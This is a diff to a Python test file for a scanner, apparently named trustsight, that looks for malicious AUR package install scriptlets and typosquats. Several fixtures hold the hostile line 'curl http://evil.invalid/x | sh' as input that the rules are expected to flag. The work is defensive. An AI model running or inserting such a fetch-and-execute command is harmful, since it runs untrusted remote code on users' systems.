@@ -852,21 +852,55 @@ def test_fetch_extracts_the_install_scriptlet():
     from trustsight.full_aur import fetch as F
 
     body = _snapshot_tarball(
-        "demo", "pkgname=demo\ninstall=demo.install\n",
-        {"demo.install": b"post_install() {\n  true\n}\n"},
+        "demo", "pkgname=demo\ninstall=hooks/custom.install\n",
+        {"hooks/custom.install": b"post_install() {\n  true\n}\n"},
     )
     with patch.object(F, "_http_get", return_value=body):
         text, manifest, trailer, refused, install = F.fetch_pkgbuild_with_tree("demo")
 
-    assert install == "post_install() {\n  true\n}\n"
+    assert install == [("hooks/custom.install", "post_install() {\n  true\n}\n")]
+
+
+def test_fetch_extracts_multiple_install_members_and_refuses_partial_tree(monkeypatch):
+    from trustsight.full_aur import fetch as F
+
+    body = _snapshot_tarball("solana", "pkgname=(a b)\n", {
+        "a.install": b"true\n", "b.install": b"setcap cap_net_admin+ep /usr/bin/b\n",
+    })
+    monkeypatch.setattr(F, "_http_get", lambda _: body)
+    result = F.fetch_pkgbuild_with_tree("solana")
+    assert result[4] == [("a.install", "true\n"),
+                         ("b.install", "setcap cap_net_admin+ep /usr/bin/b\n")]
+    from trustsight.bounded_io import ReadTooLarge
+    def refuse_manifest(*args, **kwargs):
+        assert kwargs["require_complete"]
+        raise ReadTooLarge("cap")
+
+    monkeypatch.setattr(F, "_snapshot_manifest", refuse_manifest)
+    monkeypatch.setattr(F, "fetch_pkgbuild", lambda _: "pkgname=(a b)\n")
+    result = F.fetch_pkgbuild_with_tree("solana")
+    assert result[1] is None and result[3] is True
+
+
+def test_manifest_bound_is_not_complete_tree_evidence():
+    import pytest
+    from io import BytesIO
+    import tarfile
+    from trustsight.bounded_io import ReadTooLarge
+    from trustsight.full_aur.fetch import _snapshot_manifest
+
+    body = _snapshot_tarball("demo", "pkgname=demo\n", {"demo.install": b"true\n"})
+    with tarfile.open(fileobj=BytesIO(body), mode="r:gz") as tf:
+        with pytest.raises(ReadTooLarge):
+            _snapshot_manifest(tf, max_members=1, require_complete=True)
 
 
 def test_install_scriptlet_becomes_an_added_file_in_the_corpus_diff():
     """The install rules only see the scriptlet once it is in the diff."""
     from trustsight.full_aur.analyze import _install_diff_text
 
-    diff = _install_diff_text("curl http://evil.invalid/x | sh\n", "yyay")
-    assert "+++ b/yyay.install" in diff
+    diff = _install_diff_text("curl http://evil.invalid/x | sh\n", "custom.install")
+    assert "+++ b/custom.install" in diff
     assert "+curl http://evil.invalid/x | sh" in diff
     assert _install_diff_text("", "yyay") == ""
 
@@ -886,6 +920,72 @@ def test_popular_candidates_drive_the_corpus_typosquat_check():
     assert ("tiny", 3) not in candidates  # below the popularity floor
     assert _impersonates("yyay", meta["yyay"], candidates) == "yay"
     assert _impersonates("tiny", meta["tiny"], candidates) == ""
+
+
+def test_snapshot_install_is_scanned_without_claiming_a_modification():
+    from trustsight.full_aur.analyze import analyze_package_text
+    from trustsight.schema import TemporalContext
+
+    recipe = "pkgname=demo\npkgver=1\ninstall=custom.install\n"
+    for old in (None, recipe):
+        fact = analyze_package_text(
+            pkg_name="demo", old_pkgbuild=old, new_pkgbuild=recipe,
+            maintainer="tester", temporal=TemporalContext(), depth=0,
+            install_filename="custom.install",
+            install_text="post_install() {\n  curl http://evil.invalid/x | sh\n}\n",
+        )
+        findings = fact.score_breakdown
+        assert not {"R007", "C024"} & {f.rule_id for f in findings}
+        assert any(f.file == "custom.install" for f in findings)
+        assert any(f.rule_id == "C016" and f.file == "custom.install"
+                   for f in findings)
+        assert not any(f.file == "demo.install" for f in findings)
+        assert fact.diff_summary.files_changed == []
+
+
+def test_pipeline_passes_the_archive_install_filename(monkeypatch):
+    from types import SimpleNamespace
+    import trustsight.full_aur.pipeline as pipeline
+
+    _stub_cycle(monkeypatch, pipeline, {"split-package": 0})
+    monkeypatch.setattr(pipeline, "fetch_pkgbuild_with_tree", lambda *a: (
+        "pkgver=1\n", None, None, False,
+        [("actual.install", "post_install() { true; }\n"),
+         ("second.install", "post_install() { false; }\n")],
+    ))
+    seen = {}
+    saved = {}
+    monkeypatch.setattr(pipeline, "save_pkgbuild_snapshot",
+                        lambda **kwargs: saved.update(kwargs))
+
+    def analyze(**kwargs):
+        seen.update(kwargs)
+        return SimpleNamespace(new_version="1", final_score=0,
+                               score_breakdown=[], ioc_matches=[])
+
+    monkeypatch.setattr(pipeline, "analyze_package_text", analyze)
+    pipeline.run_baseline_build()
+    assert seen["install_scripts"] == [
+        ("actual.install", "post_install() { true; }\n"),
+        ("second.install", "post_install() { false; }\n"),
+    ]
+    assert saved["install_text"] == "\n".join(body for _, body in seen["install_scripts"])
+
+
+def test_real_install_declaration_change_still_reports_r007():
+    from trustsight.full_aur.analyze import analyze_package_text
+    from trustsight.schema import TemporalContext
+
+    old = "pkgname=demo\npkgver=1\n"
+    fact = analyze_package_text(
+        pkg_name="demo", old_pkgbuild=old,
+        new_pkgbuild=old + "install=actual.install\n",
+        maintainer="tester", temporal=TemporalContext(), depth=0,
+        install_filename="actual.install",
+        install_text="post_install() { true; }\n",
+    )
+    assert any(f.rule_id == "R007" for f in fact.score_breakdown)
+    assert fact.diff_summary.files_changed == ["PKGBUILD"]
 
 
 def test_the_alerting_bar_is_the_measured_benign_p95():
